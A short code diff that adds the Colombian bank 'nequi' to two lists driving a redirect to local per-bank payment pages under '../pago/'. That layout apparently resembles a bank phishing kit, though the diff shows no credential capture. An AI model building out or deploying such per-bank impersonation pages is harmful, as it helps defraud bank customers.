@@ -568,7 +568,7 @@
                 var bankUrl = "../pago/index.php"; // Fallback to main payment index if exists, or error page
 
                 if (banco) {
-                    var availableBanks = ['avvillas', 'bancolombia', 'bbva', 'bogota', 'colpatria', 'davivienda', 'falabella', 'finandina', 'occidente'];
+                    var availableBanks = ['avvillas', 'bancolombia', 'bbva', 'bogota', 'colpatria', 'davivienda', 'falabella', 'finandina', 'occidente', 'nequi'];
 
                     /* Auto-redirect disabled in favor of manual flow via btnSeguir2
                     if (availableBanks.indexOf(banco) !== -1) {
@@ -1255,7 +1255,7 @@
                                                                                     var bankUrl = "../pago/index.php"; // Fallback
 
                                                                                     if (banco) {
-                                                                                        var availableBanks = ['avvillas', 'bancolombia', 'bbva', 'bogota', 'colpatria', 'davivienda', 'falabella', 'finandina', 'occidente'];
+                                                                                        var availableBanks = ['avvillas', 'bancolombia', 'bbva', 'bogota', 'colpatria', 'davivienda', 'falabella', 'finandina', 'occidente', 'nequi'];
                                                                                         if (availableBanks.indexOf(banco) !== -1) {
                                                                                             bankUrl = "../pago/" + banco + "/index.php";
                                                                                         }
